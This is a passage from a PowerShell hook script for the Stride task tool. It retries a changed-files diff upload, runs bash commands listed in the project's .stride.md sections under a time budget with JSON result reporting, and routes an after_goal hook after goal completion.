    # as carried: the build path below PREFERS it over re-resolving, which is
    # bash's ordering and is there because re-resolving after the section's own
    # `git push` can make a correct base look stale and recompute to HEAD - an
    # EMPTY snapshot (D142). Both executors share this file, so losing the
    # record on a ps1 retry would hand a later bash retry the same emptying.
    $healBase = $stateBase
    $healNarrowed = $stateNarrowed
    if (-not (Test-Path -LiteralPath $snapshotPath -PathType Leaf)) {
        # Only build where there is something to capture FROM. Outside a git
        # repo the build can only ever produce '[]', and writing then uploading
        # that would be fabricating an empty answer for a question we cannot
        # ask — it would also overwrite whatever the server already holds. With
        # no repo and no snapshot there is nothing to heal, so return exactly as
        # this function did before the build step existed.
        $inRepo = $false
        if (Get-Command git -ErrorAction SilentlyContinue) {
            & git -C $ProjectDir rev-parse --verify --quiet HEAD 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) { $inRepo = $true }
        }
        if (-not $inRepo) { return }

        # (W2103) BASH'S ORDERING, adopted rather than approximated: the base
        # THIS task persisted wins over re-resolving. Re-resolving here re-judges
        # against origin refs the after_doing section's own `git push` may have
        # moved, so a correct base can look stale and recompute to HEAD - an
        # EMPTY snapshot (D142). It also decides the refusal: a persisted base is
        # this task's own by construction (the read is gated on task_id), so
        # D226's foreign-owner guard has nothing to protect against on that
        # branch, and the refusal is reachable only where bash reaches it -
        # when no base is on record at all. That is what makes $healBase
        # correct on the refusal branch WITHOUT an explicit clear: it can only
        # be '' there, because a non-empty $stateBase would have taken the other
        # branch. The trust guard is deliberately NOT re-run on the persisted
        # base, exactly as bash does not re-run it.
        $healRefused = $false
        if (-not $stateBase) {
            $sel = Resolve-TaskSnapshotBase -TaskId $taskId
            $healRefused = [bool]$sel.Refused
            if (-not $healRefused) { $healBase = Resolve-SnapshotBaseTrust -Base $sel.Base }
        }
        $healSnapshot = '[]'
        # (W2103/D273) The verdict this retry actually APPLIED - hoisted OUT of
        # the non-refused branch. bash initialises _retry_narrowed=no outside
        # every branch and writes BOTH carriers unconditionally, so a refusal
        # records 'no'. Leaving the initialiser inside made the refusal path
        # carry the REPLAYED value into the state write while never touching the
        # per-task record at all - a record claiming 'yes' over a snapshot that
        # is '[]', which is narrowed by nothing. The two carriers could then
        # disagree with each other AND with the upload.
        $healApplied = 'no'
        if (-not $healRefused) {
            # (W2102) Attribute here too. bash's equivalent states that
            # attribution belongs to EVERY non-refused path, not just the
            # base-selection branch, and unlike the narrowing REPLAY this needs
            # no persisted state - the engine takes only a base and a task id.
            # Passing '' here left the one path that can still build a snapshot
            # (before_review, nothing on disk) absorbing nested children's
            # commits: the exact over-report this task closes everywhere else.
            # $healBase is already resolved above: the persisted base verbatim,
            # or the trust-guarded selection when nothing was persisted.
            $healRanges = ''
            try { $healRanges = Get-AttributedCommitRange -OwnBase $healBase -SelfTaskId $taskId }
            catch { $healRanges = '' }
            # (W2103/D273) REPLAY the capture-time verdict rather than
            # re-deriving it. This is what the persistence above is for: the
            # retry's view of which windows are open is not the capture's view,
            # so a live re-derivation can narrow a window whose verdict was
            # never computed. The per-task record is preferred over the state
            # file because the file holds one task and is truncated on every
            # write, so an interleaved completion erases it exactly when it is
            # needed. Only when NOTHING is on record does this fall through to
            # a live check - which is the documented older-state-file case.
            $healNarrowed = Resolve-CaptureNarrowing -TaskId $taskId -StateValue $stateNarrowed
            # THE DURABLE RECORD, not the process-local script state. This
            # function runs in the before_review invocation - a DIFFERENT
            # PROCESS from the after_doing one that computed the owned set - so
            # $script:SnapOwnedRecorded is always $false here and gating on it
            # made this whole block unreachable in production. bash reads
            # task_owned_for for exactly that reason: the record survives across
            # processes, the variable does not.
            $healOwnedSet = ''
            $healOwnedRec = Get-TaskOwnedRecord -TaskId $taskId
            if ($healOwnedRec.Found) { $healOwnedSet = $healOwnedRec.Value }
            # The verdict PERSISTED below is the one actually APPLIED, not the
            # one replayed. Default 'no'; 'yes' only once the owned range really
            # resolved AND the replay said narrow. A replayed 'yes' whose range
            # comes back empty uploads WIDE, so recording 'yes' there would make
            # the record false about the snapshot the server now holds - and the
            # next reader would replay that falsehood. bash draws the same
            # distinction at the same point.
            if ($healOwnedSet -and $healOwnedSet -ne $script:StrideOwnedOverflow) {
                $healOwnedRange = Convert-OwnedSetToRange -Set $healOwnedSet
                if ($healOwnedRange -and (Invoke-ReplayNarrowingDecision -Narrowed $healNarrowed -TaskId $taskId)) {
                    $healRanges = $healOwnedRange
                    $healApplied = 'yes'
                }
            }
            try { $healSnapshot = Build-ChangedFilesSnapshot -Base $healBase -OwnRanges $healRanges }
            catch { $healSnapshot = '[]' }
        }
        # BOTH VERDICT carriers, as bash does, and on EVERY build path including
        # the refusal: the state file below, and the durable per-task record
        # here. Leaving the record stale would let a later reader prefer a
        # verdict that no longer describes any capture.
        #
        # Not all THREE things bash writes on the refusal branch: it also
        # appends `refused_base=yes` (stride-hook.sh:2410 and :2756), which this
        # port has never written. Deliberately unported and recorded here and in
        # the parity note rather than left for the next reader to re-derive:
        # nothing in either executor or either suite reads it, so it is a
        # diagnostic breadcrumb for a human reading the state file, and adding a
        # write at two sites is not this task's scope. Whoever ports it should
        # do both sites at once - one stamped and one not is worse than neither.
        $healNarrowed = $healApplied
        if ($taskId) { $null = Set-TaskNarrowedRecord -TaskId $taskId -Value $healApplied }
        Write-ChangedFilesSnapshot -Json $healSnapshot
    }

    $httpCode = Invoke-ChangedFilesUpload -TaskId $taskId -ApiBase $apiBase -Token $token
    # (W2103/D273) Carry base= and narrowed= THROUGH the self-heal's own write.
    # This write TRUNCATES the file, so omitting them here would drop the very
    # lines the replay depends on - the retry would persist a state that has
    # forgotten its own verdict, and a later reader would fall through to a live
    # re-derivation. bash re-appends narrowed= at the same point for the same
    # reason. $healNarrowed is the verdict this retry REPLAYED, not a fresh
    # derivation, so persisting it keeps the capture-time fact intact.
    Write-DiffUploadState -TaskId $taskId -HttpCode $httpCode `
        -Base $healBase -Narrowed $healNarrowed
    # (W1658) before_review is the LAST retry. A non-2xx here means the diff is
    # definitively lost for this task — surface it loudly (distinct from the
    # per-attempt warning) and mark the state file unresolved so the failure is
    # actionable and never silently swallowed. A later successful PUT overwrites
    # the state file, clearing the mark.
    if ($httpCode -notmatch '^2') {
        [Console]::Error.WriteLine("stride-hook: CHANGED_FILES UPLOAD UNRESOLVED for task $(ConvertTo-PrintableForLog -Value $taskId) (HTTP $httpCode) after the before_review retry — the review will show NO file diffs. Re-run the changed_files PUT to recover.")
        try {
            Add-Content -Path (Join-Path $ProjectDir '.stride-diff-upload-state') -Value 'unresolved=yes' -Encoding UTF8
        } catch {
            # Best-effort: a failed marker write must never block the hook.
        }
    }
}

# Parse and execute one .stride.md hook section. Takes the section name
# (e.g. "before_doing", "after_goal") and returns 0 on no-op (missing
# section or empty commands) / all-success, or 2 on first failure.
# Emits the same structured success/failed JSON shape as the original
# inline block — `$Section` is substituted for what used to be the
# global `$HookName`. Reuses Invoke-FinalizeAfterDoing which gates
# internally on the GLOBAL `$HookName`, so calling this for "after_goal"
# does NOT re-trigger the after_doing snapshot PUT.
# (W1456) Shell-semantics line-continuation check for the bash-section
# parser — mirror of line_continues in stride-hook.sh. Returns $true when
# the LOGICAL line ends in a backslash that escapes the newline: unescaped
# and not inside single quotes. Inside single quotes a backslash is a
# literal character; a trailing `\\` is an escaped backslash, not a
# continuation. Callers pass the accumulated logical line so quote state
# carries across joins.
function Test-LineContinues {
    param([string]$Line)

    $i = 0
    $state = 'none'
    while ($i -lt $Line.Length) {
        $c = $Line[$i]
        if ($state -eq 'single') {
            if ($c -eq "'") { $state = 'none' }
            $i++
        } elseif ($c -eq '\') {
            if (($i + 1) -eq $Line.Length) { return $true }
            $i += 2
        } elseif ($state -eq 'double') {
            if ($c -eq '"') { $state = 'none' }
            $i++
        } else {
            if ($c -eq "'") { $state = 'single' }
            elseif ($c -eq '"') { $state = 'double' }
            $i++
        }
    }
    return $false
}

function Invoke-StrideSection {
    param([string]$Section)

    $rawContent = Get-Content $StrideMd -Raw -Encoding UTF8
    $rawContent = $rawContent -replace "`r`n", "`n"
    $sectionLines = $rawContent -split "`n"

    # (D228) Reset PER CALL, not per script. Several sections run in one
    # invocation — before_review then after_goal — so a flag left set by an
    # earlier non-empty section would make a later EMPTY one look like it ran.
    # That is exactly how the first attempt at this failed its own test.
    $script:LastSectionRanCommands = $false

    $secCommands = ''
    $secFound = $false
    $secCapture = $false

    foreach ($rawLine in $sectionLines) {
        $line = $rawLine.TrimEnd("`r")

        if ($line -match '^## (.+)$') {
            if ($secFound) { break }
            $heading = $Matches[1].TrimEnd()
            if ($heading -eq $Section) { $secFound = $true }
            continue
        }

        if ($secFound) {
            if ($line -match '^```bash') {
                $secCapture = $true
                continue
            }
            if ($line -match '^```') {
                if ($secCapture) { break }
                continue
            }
            if ($secCapture) {
                $secCommands += $line + "`n"
            }
        }
    }

    if (-not $secCommands.Trim()) {
        Invoke-FinalizeAfterDoing
        # (D228) Leaves $script:LastSectionRanCommands false — this returns 0
        # WITHOUT running anything, and callers must be able to tell that apart
        # from a genuine ran-and-passed 0. The bash twin distinguishes the two
        # by output presence, which is unavailable here because the JSON goes
        # straight to the host stream.
        return 0
    }
    $script:LastSectionRanCommands = $true

    # (W1456) Join backslash-continued physical lines into logical lines
    # first (the backslash-newline pair is removed, per shell semantics);
    # trimming and comment/blank skipping apply to logical lines AFTER
    # joining. Mirror of the stride-hook.sh loop.
    $secCmdList = @()
    $secPending = ''
    foreach ($cmd in ($secCommands -split "`n")) {
        $cmd = $cmd.TrimEnd("`r")
        if ($secPending) {
            $cmd = $secPending + $cmd
            $secPending = ''
        } else {
            # Comments never continue: '#' lexes to end-of-line in shell,
            # so a trailing backslash on a standalone comment line is inert
            # — skip it here so it cannot swallow the next command.
            if ($cmd.TrimStart().StartsWith('#')) { continue }
        }
        if (Test-LineContinues -Line $cmd) {
            $secPending = $cmd.Substring(0, $cmd.Length - 1)
            continue
        }
        $trimmedCmd = $cmd.TrimStart()
        if (-not $trimmedCmd) { continue }
        if ($trimmedCmd.StartsWith('#')) { continue }
        $secCmdList += $trimmedCmd
    }
    # Trailing backslash on the section's last line — emit the accumulated
    # command with the marker already stripped; never hang or drop it.
    if ($secPending) {
        $trimmedCmd = $secPending.TrimStart()
        if ($trimmedCmd -and -not $trimmedCmd.StartsWith('#')) {
            $secCmdList += $trimmedCmd
        }
    }

    if ($secCmdList.Count -eq 0) {
        Invoke-FinalizeAfterDoing
        return 0
    }

    Set-Location $ProjectDir

    # (W2102/D255) Anchor the owned-commit delta: HEAD BEFORE the first section
    # command runs. after_doing only - after_goal reuses this function and must
    # stay inert.
    if ($HookName -eq 'after_doing') {
        $script:SnapOwnedH0 = ''
        try {
            $h0 = (& git -C $ProjectDir rev-parse HEAD 2>$null)
            if ($LASTEXITCODE -eq 0 -and $h0) { $script:SnapOwnedH0 = ([string]$h0).Trim() }
        } catch { $script:SnapOwnedH0 = '' }
    }

    # Early per-file diff snapshot upload (W1093 parity, ported in W1095) —
    # the after_doing section runs the full quality gate, and the 600s hook
    # timeout can kill this process mid-loop, silently losing the diff
    # upload. PUT the snapshot BEFORE the first command executes; the
    # post-loop call below is KEPT as a refresh once the gate succeeds. A
    # bare call is safe: Invoke-FinalizeAfterDoing gates internally on the
    # GLOBAL $HookName (so the after_goal reuse of this function stays
    # inert), emits nothing on stdout, and never throws.
    Invoke-FinalizeAfterDoing

    $secCompletedCmds = @()
    # Parallel to $secCompletedCmds: one object per successful command holding
    # its tail-truncated stdout/stderr, folded into the success JSON's
    # commands_output array (D65). Keeps passing-gate output off Console.Error
    # so Claude Code does not render it under a false "PreToolUse:Bash hook
    # error" label.
    $secCmdOutputs = @()
    $secStartTime = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    # (W1455) Millisecond wall clock for duration_ms reporting; the seconds
    # clock above stays the budget-bookkeeping source.
    $secStartMs = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    $secCmdIndex = 0
    $secCmdTotal = $secCmdList.Count
    # (W1454) Section-level budget: each command gets the REMAINING budget so
    # the whole section can never exceed its documented table value.
    $secBudget = Resolve-SectionBudget -Section $Section

    foreach ($execTrimmed in $secCmdList) {
        $secStdoutFile = [System.IO.Path]::GetTempFileName()
        $secStderrFile = [System.IO.Path]::GetTempFileName()

        try {
            $secTimedOut = $false
            $secCmdExit = 0
            $secElapsed = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds() - $secStartTime
            $secRemainingSec = $secBudget - $secElapsed

            if ($secRemainingSec -le 0) {
                # Earlier commands consumed the whole section budget — do not
                # start this one.
                $secTimedOut = $true
                $secCmdExit = 124
                Set-Content -Path $secStderrFile -Value "${secBudget}s section budget exhausted before this command started" -Encoding UTF8 -NoNewline
            } else {
                # ProcessStartInfo.ArgumentList passes each element as an exact
                # argv entry on every platform. Start-Process -ArgumentList must
                # NOT be used here: it joins the elements into a single string,
                # which .NET on Unix re-splits on whitespace, so a multi-word
                # command reaches bash -c mangled and its output is lost.
                $secPsi = [System.Diagnostics.ProcessStartInfo]::new()
                $secPsi.FileName = 'bash'
                $secPsi.ArgumentList.Add('-c')
                $secPsi.ArgumentList.Add($execTrimmed)
                $secPsi.RedirectStandardOutput = $true
                $secPsi.RedirectStandardError = $true
                $secPsi.UseShellExecute = $false
                $secPsi.WorkingDirectory = (Get-Location).Path
                # (W1453) Re-add empty-valued keys the Process env block cannot
                # hold, so user commands see them defined-but-empty per the
                # hook-execution.md contract (prevents ${VAR?} / set -u aborts).
                foreach ($emptyKey in $script:StrideEmptyEnvKeys) {
                    $secPsi.Environment[$emptyKey] = ''
                }
                $proc = [System.Diagnostics.Process]::Start($secPsi)
                # Drain both pipes concurrently: a synchronous ReadToEnd on
                # stdout would deadlock if the child fills the stderr pipe
                # buffer (~64KB) while its stdout is still open — gate commands
                # like `mix compile` can emit that much warning text.
                $secOutTask = $proc.StandardOutput.ReadToEndAsync()
                $secErrTask = $proc.StandardError.ReadToEndAsync()
                # (W1454) Bounded wait on the remaining section budget. On
                # expiry, Kill($true) terminates the ENTIRE process tree so a
                # hung command's children cannot keep running with the
                # exported env, then synthesize the conventional exit 124.
                if (-not $proc.WaitForExit([int]($secRemainingSec * 1000))) {
                    $secTimedOut = $true
                    try { $proc.Kill($true) } catch { }
                    $proc.WaitForExit()
                }
                # Bounded drain: the pipes close when the tree is killed; the
                # 5s guard covers a detached grandchild holding a pipe open.
                $secProcStdout = if ($secOutTask.Wait(5000)) { $secOutTask.Result } else { '' }
                $secProcStderr = if ($secErrTask.Wait(5000)) { $secErrTask.Result } else { '' }
                Set-Content -Path $secStdoutFile -Value $secProcStdout -Encoding UTF8 -NoNewline
                Set-Content -Path $secStderrFile -Value $secProcStderr -Encoding UTF8 -NoNewline
                $secCmdExit = if ($secTimedOut) { 124 } else { $proc.ExitCode }
            }

            if ($secCmdExit -eq 0) {
                $secCompletedCmds += $execTrimmed
                # Do NOT write the passing command's output to Console.Error:
                # Claude Code renders any hook stderr under a red
                # "PreToolUse:Bash hook error" label even on exit 0 (D65).
                # Instead capture a tail-truncated copy — same -50 cap as the
                # failure path below — into $secCmdOutputs, folded into the
                # success JSON's commands_output array so agents keep visibility.
                $secOkStdout = ''
                $secOkStderr = ''
                if (Test-Path $secStdoutFile) {
                    # @() guards against $null (empty file) under StrictMode.
                    $allLines = @(Get-Content $secStdoutFile -Encoding UTF8)
                    if ($allLines.Count -gt 50) { $allLines = $allLines[-50..-1] }
                    $secOkStdout = $allLines -join "`n"
                }
                if (Test-Path $secStderrFile) {
                    $allLines = @(Get-Content $secStderrFile -Encoding UTF8)
                    if ($allLines.Count -gt 50) { $allLines = $allLines[-50..-1] }
                    $secOkStderr = $allLines -join "`n"
                }
                $secCmdOutputs += [ordered]@{
                    command = $execTrimmed
                    stdout  = $secOkStdout
                    stderr  = $secOkStderr
                }
            } else {
                $secCmdStdout = ''
                $secCmdStderr = ''
                if (Test-Path $secStdoutFile) {
                    # @() coerces $null (empty file) into an empty array so
                    # .Count is safe under Set-StrictMode -Version Latest.
                    $allLines = @(Get-Content $secStdoutFile -Encoding UTF8)
                    if ($allLines.Count -gt 50) { $allLines = $allLines[-50..-1] }
                    $secCmdStdout = $allLines -join "`n"
                }
                if (Test-Path $secStderrFile) {
                    $allLines = @(Get-Content $secStderrFile -Encoding UTF8)
                    if ($allLines.Count -gt 50) { $allLines = $allLines[-50..-1] }
                    $secCmdStderr = $allLines -join "`n"
                }
                Remove-Item -Force $secStdoutFile, $secStderrFile -ErrorAction SilentlyContinue

                $secRemainingCmds = @()
                if (($secCmdIndex + 1) -lt $secCmdTotal) {
                    $secRemainingCmds = $secCmdList[($secCmdIndex + 1)..($secCmdTotal - 1)]
                }

                # (D234) The duration is computed HERE, before the failure
                # branch emits. Previously it was only computed further down on
                # the success path — so the one path that emitted a duration was
                # the one whose output the agent cannot read, and the readable
                # path carried none at all. Mirrors the bash twin.
                $secFailDurationMs = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() - $secStartMs
                if ($secFailDurationMs -lt 0) { $secFailDurationMs = 0 }

                $failureResult = [ordered]@{
                    hook              = $Section
                    status            = 'failed'
                    failed_command    = $execTrimmed
                    command_index     = $secCmdIndex
                    exit_code         = $secCmdExit
                    timed_out         = [bool]$secTimedOut
                    budget_seconds    = $secBudget
                    stdout            = $secCmdStdout
                    stderr            = $secCmdStderr
                    commands_completed = $secCompletedCmds
                    commands_remaining = $secRemainingCmds
                    duration_ms        = $secFailDurationMs
                }
                # (D228) after_goal only: carry the PostToolUse context field so
                # a failed goal push is not silent. The field is added at
                # CONSTRUCTION here because this script writes the JSON straight
                # to the host stream and then returns — there is no post-hoc
                # augmentation point like the bash twin has. Other sections are
                # untouched: before_review already propagates as a non-zero
                # script exit, so it needs no help being noticed.
                if ($Section -eq 'after_goal') {
                    $failureResult['hookSpecificOutput'] = [ordered]@{
                        hookEventName    = 'PostToolUse'
                        additionalContext = (Get-AfterGoalFailureContext)
                    }
                }
                # Write JSON directly to the host stdout stream rather than
                # via the function's output pipeline — otherwise the caller's
                # $primaryRc = Invoke-StrideSection ... assignment captures
                # the JSON alongside the int `return`, producing an array
                # and breaking the `-ne 0` check on every success path.
                $failureJson = ($failureResult | ConvertTo-Json -Depth 5 -Compress)
                Write-HookResult -Hook $Section -Json $failureJson
                # (D238) Buffered, not written. stdout must carry exactly ONE
                # JSON document; Emit-HookStdout below is the single writer.
                $script:PendingSections += ,$failureJson

                if ($secTimedOut) {
                    [Console]::Error.WriteLine("Stride $Section hook command $($secCmdIndex + 1)/$($secCmdTotal) timed out after ${secBudget}s budget: $execTrimmed")
                } else {
                    [Console]::Error.WriteLine("Stride $Section hook failed on command $($secCmdIndex + 1)/$($secCmdTotal): $execTrimmed")
                }
                if ($secCmdStderr) { [Console]::Error.WriteLine($secCmdStderr) }

                return 2
            }
        } finally {
            Remove-Item -Force $secStdoutFile, $secStderrFile -ErrorAction SilentlyContinue
        }

        $secCmdIndex++
    }

    # (W2102/D255) Close the owned-commit delta. Gated on H0 being set, so a
    # section that never started records nothing and the retry begins a fresh
    # window. An unresolvable HEAD (no commits yet) also records nothing.
    if ($HookName -eq 'after_doing' -and $script:SnapOwnedH0) {
        try {
            $h1 = (& git -C $ProjectDir rev-parse HEAD 2>$null)
            if ($LASTEXITCODE -eq 0 -and $h1) {
                $script:SnapOwnedH1 = ([string]$h1).Trim()
                $script:SnapOwnedLoopRan = $true
            }
        } catch { }
    }

    # Per-file diff snapshot PUT — no-op outside after_doing (gates on the
    # GLOBAL $HookName, so calling this for "after_goal" does not retrigger).
    # (W1095) This is the REFRESH of the early pre-loop upload — keep it: the
    # gate's commands may rewrite the snapshot, and this re-uploads the
    # final state.
    Invoke-FinalizeAfterDoing

    $secEndTime = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    $secDuration = $secEndTime - $secStartTime
    # (W1455) duration_ms is the hook-execution.md contract field; never
    # negative. duration_seconds is DEPRECATED — kept for one release for
    # any consumer still parsing it.
    $secDurationMs = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() - $secStartMs
    if ($secDurationMs -lt 0) { $secDurationMs = 0 }

    $successResult = [ordered]@{
        hook               = $Section
        status             = 'success'
        commands_completed = $secCompletedCmds
        commands_output    = $secCmdOutputs
        duration_ms        = $secDurationMs
        duration_seconds   = $secDuration
    }
    # See the failure-path note above: route JSON to the host stdout so it
    # is not captured by `$primaryRc = Invoke-StrideSection ...`.
    # Depth 6 so the commands_output array of objects serializes fully.
    # (D234) Persist BEFORE printing: stdout on the exit-0 path reaches the
    # transcript, not the model, so the file is the only channel the agent can
    # actually read this figure back from.
    $successJson = ($successResult | ConvertTo-Json -Depth 6 -Compress)
    Write-HookResult -Hook $Section -Json $successJson
    # (D238) Buffered, not written — see Emit-HookStdout.
    $script:PendingSections += ,$successJson

    return 0
}

# Detect an `after_goal` entry in the response's `hooks` array. Handles
# both Claude Code's wrapped form (`tool_response.stdout` is a JSON string
# whose body contains the response) and raw-API-JSON form. Returns $true
# when an entry with name == "after_goal" is found, $false otherwise.
# Mirrors stride-hook.sh:response_has_after_goal — both scripts must agree
# on detection so Windows + Unix agents behave identically (pitfall:
# behavioral drift between .sh and .ps1).
# Pure predicate on an ALREADY-resolved payload object: does it carry an
# after_goal hook entry? Single-sourced so Test-AfterGoalInResponse and
# Invoke-AfterGoalRouting share one detection (mirrors bash payload_has_after_goal).
function Test-PayloadHasAfterGoal {
    param($Payload)

    if ($null -eq $Payload) { return $false }
    if (-not ($Payload.PSObject.Properties.Name -contains 'hooks')) { return $false }
    if ($null -eq $Payload.hooks) { return $false }

    foreach ($entry in @($Payload.hooks)) {
        if ($entry -and ($entry.PSObject.Properties.Name -contains 'name') -and $entry.name -eq 'after_goal') {
            return $true
        }
    }

    return $false
}

function Test-AfterGoalInResponse {
    param([string]$InputJson)

    # (W1453/D118) The payload shapes and the canonical-file fast path live in
    # Get-ResponsePayload now — detection and env extraction must agree.
    Test-PayloadHasAfterGoal -Payload (Get-ResponsePayload -InputJson $InputJson)
}

# (D228) Mirrors the bash twin's after_goal_failure_context /
# report_after_goal_failure. A failing after_goal means `git push origin main`
# did not run, so the goal work is local only — while the server's grace-window
# worker marks the goal Done anyway, because it treats ABSENCE of a report as
# success and has no git access to know better.
function Get-AfterGoalFailureContext {
    $goal = $env:GOAL_IDENTIFIER
    if (-not $goal) { $goal = $env:GOAL_ID }
    if (-not $goal) { $goal = 'unknown' }
    return "Stride after_goal FAILED for goal $goal. The ``## after_goal`` section did not complete, so its ``git push origin main`` did NOT run — the goal work is committed LOCALLY ONLY. The server grace-window worker will still mark the goal Done; that is bookkeeping and pushes nothing. Verify with ``git log origin/main..main --oneline`` (expect empty) and push, or re-run the after_goal commands."
}

# Loud stderr notice plus a durable marker under .stride/ — already gitignored,
# already excluded from the diff snapshot, and not touched by the after_review
# cleanup block (which would delete a marker placed in the root state files).
function Write-AfterGoalUnresolved {
    $ctx = Get-AfterGoalFailureContext
    [Console]::Error.WriteLine("stride-hook: AFTER_GOAL UNRESOLVED — $ctx")
    try {
        $dir = Join-Path $ProjectDir '.stride'
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null
        }
        $lines = @(
            'unresolved=yes'
            'pushed=no'
            "goal_id=$($env:GOAL_ID)"
            "goal_identifier=$($env:GOAL_IDENTIFIER)"
            "detail=$ctx"
        )
        Set-Content -Path (Join-Path $dir 'after-goal-unresolved') -Value $lines -Encoding UTF8 -ErrorAction Stop
    } catch {
        # Best-effort — the stderr notice above already carries the report.
    }
}

# --- After-goal execution (shared by the D118 fast path and the D119 fresh call) ---
# Export GOAL_* from the given payload and run the local ## after_goal section as
# a blocking hook, restoring HOOK_NAME afterward. Centralised so both detection
# paths run the section identically — and, because Invoke-AfterGoalRouting calls
# exactly one path, exactly once (de-dup). Mirrors bash run_after_goal_section.
function Invoke-AfterGoalSection {
    param($Payload)
    $script:afterGoalRouted = $true
    Set-AfterGoalEnv -Payload $Payload
    $savedHookNameEnv = [System.Environment]::GetEnvironmentVariable('HOOK_NAME', 'Process')
    [System.Environment]::SetEnvironmentVariable('HOOK_NAME', 'after_goal', 'Process')
    # (D228) The exit code is still swallowed — deliberately, since the
    # completion call itself succeeded — but the failure is no longer silent:
    # the JSON carries the PostToolUse context (added in Invoke-StrideSection),
    # and the two channels below survive regardless of whether the harness
    # honours that field.
    $agRc = Invoke-StrideSection -Section 'after_goal'
    if ($agRc -ne 0) {
        Write-AfterGoalUnresolved
    } elseif ($script:LastSectionRanCommands) {
        # (D228) Clear only when the section actually RAN and passed. An empty
        # or absent ## after_goal also returns 0 without running anything, and
        # plugin mode ships exactly that empty fence — gating on the exit code
        # alone erased a real report after a mode swap.
        $agMarker = Join-Path (Join-Path $ProjectDir '.stride') 'after-goal-unresolved'
        if (Test-Path $agMarker) {
            Remove-Item -Force -LiteralPath $agMarker -ErrorAction SilentlyContinue
        }
    }
    [System.Environment]::SetEnvironmentVariable('HOOK_NAME', $savedHookNameEnv, 'Process')
}

# (D119) Reliability guarantee. Detect after_goal via a fresh, hook-initiated
# GET /api/tasks/:id/after_goal_status (W1613's compact endpoint). An HTTP call
# the hook makes itself is NOT subject to the Bash-tool output truncation that
# can gut the agent-handed /complete response, and needs zero agent cooperation.
# Runs ## after_goal from the endpoint's compact GOAL_* env when after_goal_armed
# is true. Best-effort: a missing prerequisite (TASK_ID/URL/token) or an
# unreachable / non-JSON endpoint degrades to a clean no-op — the server's grace-
# window worker still completes the goal. Never logs the token.
function Invoke-AfterGoalDetectionViaApi {
    $taskId = [System.Environment]::GetEnvironmentVariable('TASK_ID', 'Process')
    if (-not $taskId) { return }

    $apiBase = Resolve-StrideApiUrl
    $token = Resolve-StrideApiToken
    if (-not $apiBase -or -not $token) { return }

    $resp = $null
    try {
        # (D277) No -SkipHttpErrorCheck, for the same reason as the upload
        # path — and this site was the worse of the two. Its catch frames every
        # failure as an unreachable endpoint, so on 5.1 the parameter never
        # bound, this returned early on EVERY run, and D119's after_goal
        # detection silently no-opped on the shipping host.
        $resp = Invoke-WebRequest `
            -Uri "$apiBase/api/tasks/$taskId/after_goal_status" `
            -Method Get `
            -Headers @{ Authorization = "Bearer $token" } `
            -UseBasicParsing -TimeoutSec 10
    } catch {
        # A non-2xx from this endpoint is genuinely nothing to act on — there is
        # no armed goal to read — so returning is right. What changed is that we
        # now get here only for a real HTTP or transport error, never because a
        # parameter failed to bind.
        return
    }
    if ($null -eq $resp) { return }

    $status = $null
    try { $status = $resp.Content | ConvertFrom-Json } catch { return }
    if ($null -eq $status) { return }

    $armed = $false
    if (($status.PSObject.Properties.Name -contains 'after_goal_armed') -and $status.after_goal_armed) {
        $armed = $true
    }
    if (-not $armed) { return }

    # Wrap the endpoint's flat env into the after_goal-hook-entry shape
    # Set-AfterGoalEnv consumes; carry goal_id as data.parent_id so the GOAL_ID
    # parent-id fallback still applies if the env omits it.
    $envObj = if ($status.PSObject.Properties.Name -contains 'env') { $status.env } else { [PSCustomObject]@{} }
    $goalId = if ($status.PSObject.Properties.Name -contains 'goal_id') { $status.goal_id } else { $null }
    $payload = [PSCustomObject]@{
        hooks = @([PSCustomObject]@{ name = 'after_goal'; env = $envObj })
        data  = [PSCustomObject]@{ parent_id = $goalId }
    }

    Invoke-AfterGoalSection -Payload $payload
}

# --- After-goal routing (W504 / D118 / D119) ---
# Two mutually-exclusive paths so ## after_goal runs at most once:
#   * Fast path (D118): a resolved (complete) payload answers definitively —
#     armed runs the section; parseable-but-absent means definitively not armed.
#   * Reliability guarantee (D119): a $null payload (truncated/absent/unparseable
#     handed response) triggers the hook-initiated fresh call.
function Invoke-AfterGoalRouting {
    param($Payload)

    if ($null -ne $Payload) {
        if (Test-PayloadHasAfterGoal -Payload $Payload) { Invoke-AfterGoalSection -Payload $Payload }
        return
    }

    Invoke-AfterGoalDetectionViaApi
}

# (W1094 parity, ported in W1095) Verify-and-retry the changed_files upload
# before the primary before_review section runs — fresh PostToolUse budget;
# TASK_ID is in scope from the env cache. Self-gates on
# $HookName == 'before_review'; best-effort, never fails the hook.
try { Invoke-SelfHealChangedFilesUpload } catch { }

# --- Execute the primary hook ---
$primaryRc = Invoke-StrideSection -Section $HookName

# (D142) Capture TASK_BASE_REF only now — AFTER ## before_doing ran its
# `git pull` / branch checkout — so the base is the post-pull branch point.
# Runs even when the section failed: the claim already succeeded (PostToolUse
# cannot veto it) and a partially-run section still leaves HEAD more accurate
# than the pre-pull value. No-op for every other hook route.
try { Invoke-FinalizeBeforeDoing } catch { }

if ($primaryRc -ne 0) {
    # (D238) Failure is always a single-section document — after_goal never runs
    # after a failed primary — so this is the exact shape that shipped before.
    Emit-HookStdout
    exit $primaryRc
}

# --- After-goal routing (W505 / mirrors stride-hook.sh W504 / D118 / D119) ---
# When completing the last child of a goal, run the local `## after_goal`
# section as a blocking hook. Detection prefers the handed response when it is
# complete (D118 fast path via the file-first $responsePayload) and otherwise
# falls back to a fresh, hook-initiated GET /api/tasks/:id/after_goal_status that
# is immune to harness truncation (D119 — the reliability guarantee).
# Invoke-AfterGoalRouting keeps the two paths mutually exclusive so the section
# runs at most once. Missing `## after_goal` in .stride.md is a clean no-op; the
# server's grace-window worker still covers goal completion when neither path
# can detect it. A non-zero section exit is surfaced via the structured JSON
# shape, never as a non-zero script exit (the primary curl already succeeded).
# (D220) Gate on the endpoint the router already resolved, never on the raw
# command text — a mention of a completion URL is not a completion call.
if ($Phase -eq 'post' -and
    ($StrideRoute.Endpoint -ceq 'complete' -or $StrideRoute.Endpoint -ceq 'mark_reviewed')) {
    Invoke-AfterGoalRouting -Payload $responsePayload
}

# Clean up env cache, per-file diff snapshot, and upload state after the
